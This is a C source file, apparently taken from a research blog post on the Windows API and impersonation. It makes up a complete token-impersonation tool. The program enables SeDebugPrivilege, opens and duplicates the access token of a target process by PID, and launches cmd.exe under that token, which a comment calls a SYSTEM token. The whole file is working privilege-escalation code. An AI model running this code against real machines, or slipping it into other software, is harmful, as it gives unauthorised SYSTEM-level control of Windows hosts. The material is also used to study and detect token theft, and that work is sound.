// https://0x00-0x00.github.io/research/2018/10/17/Windows-API-and-Impersonation-Part1.html



#include <Windows.h>
#include <tchar.h>
#include <stdio.h>

BOOL EnableWindowsPrivilege(char* Privilege){
	/* Tries to enable privilege if it is present to the Permissions set. */
	LUID luid;
	TOKEN_PRIVILEGES tp;
	HANDLE currentProcess = GetCurrentProcess();
	HANDLE currentToken;

	if (!LookupPrivilegeValueA(NULL, Privilege, &luid)) return FALSE;

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	
	if (!OpenProcessToken(currentProcess, TOKEN_ALL_ACCESS, &currentToken)) return FALSE;
	if (!AdjustTokenPrivileges(currentToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) return FALSE;
	return TRUE;
}



BOOL CheckWindowsPrivilege(char* Privilege){
	/* Checks for Privilege and returns True or False. */
	LUID luid;
	PRIVILEGE_SET privs;
	HANDLE hProcess;
	HANDLE hToken;
	hProcess = GetCurrentProcess();
	if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) return FALSE;
	if (!LookupPrivilegeValueA(NULL, Privilege, &luid)) return FALSE;
	privs.PrivilegeCount = 1;
	privs.Control = PRIVILEGE_SET_ALL_NECESSARY;
	privs.Privilege[0].Luid = luid;
	privs.Privilege[0].Attributes = SE_PRIVILEGE_ENABLED;
	BOOL bResult;
	PrivilegeCheck(hToken, &privs, &bResult);
	return bResult;
}

HANDLE GetAccessToken(DWORD pid){

	/* Retrieves an access token for a process */
	HANDLE currentProcess;
	HANDLE AccessToken;
	DWORD LastError;

	if (pid == 0){
		currentProcess = GetCurrentProcess();
	}else{
		currentProcess = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, pid);
		if (!currentProcess){
			LastError = GetLastError();
			printf("ERROR: OpenProcess(): %ld\n", LastError);
			return (HANDLE)NULL;
		}
	}
	if (!OpenProcessToken(currentProcess, TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, &AccessToken))
	{
		LastError = GetLastError();
		printf("ERROR: OpenProcessToken(): %ld\n", LastError);
		return (HANDLE)NULL;
	}
	return AccessToken;
}




int wmain(int argc, WCHAR** argv){
	DWORD pid;

	if (argc < 2) {
		wprintf(L"Usage: %ls <PID>\n", argv[0]);
		return FALSE;
	}

	if (!EnableWindowsPrivilege(SE_DEBUG_NAME)){
		printf("Could not enable SeDebugPrivilege!\n");
		return FALSE;
	}
	if (!CheckWindowsPrivilege(SE_DEBUG_NAME)){
		printf("I do not have SeDebugPrivilege!\n");
		return FALSE;
	}
	wprintf(L"[+] SeDebugPrivilege set !\n");

	pid = _wtoi(argv[1]);
	if (pid == 0) 
		return 1;

	printf("[+] Pid Chosen: %d\n", pid);

	// Retrieves the remote process token.
	HANDLE pToken = GetAccessToken(pid);

	//These are required to call DuplicateTokenEx.
	SECURITY_IMPERSONATION_LEVEL seImpersonateLevel = SecurityImpersonation;
	TOKEN_TYPE tokenType = TokenPrimary;
	HANDLE pNewToken;
	if (!DuplicateTokenEx(pToken, MAXIMUM_ALLOWED, 0, seImpersonateLevel, tokenType, &pNewToken)){
		DWORD LastError = GetLastError();
		wprintf(L"ERROR: Could not duplicate process token [%d]\n", LastError);
		return TRUE;
	}
	printf("[+] Process token has been duplicated.\n");

	/* Starts a new process with SYSTEM token */
	STARTUPINFOW si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(STARTUPINFOW));
	ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
	si.cb = sizeof(STARTUPINFOW);


	if (!CreateProcessWithTokenW(pNewToken, LOGON_NETCREDENTIALS_ONLY, L"C:\\Windows\\System32\\cmd.exe", NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)){
		DWORD lastError = GetLastError();
		printf("CreateProcessWithTokenW: %d\n", lastError);
		return TRUE;
	}
	printf("[i] Process created !\n");
	system("pause");
	return FALSE;
}
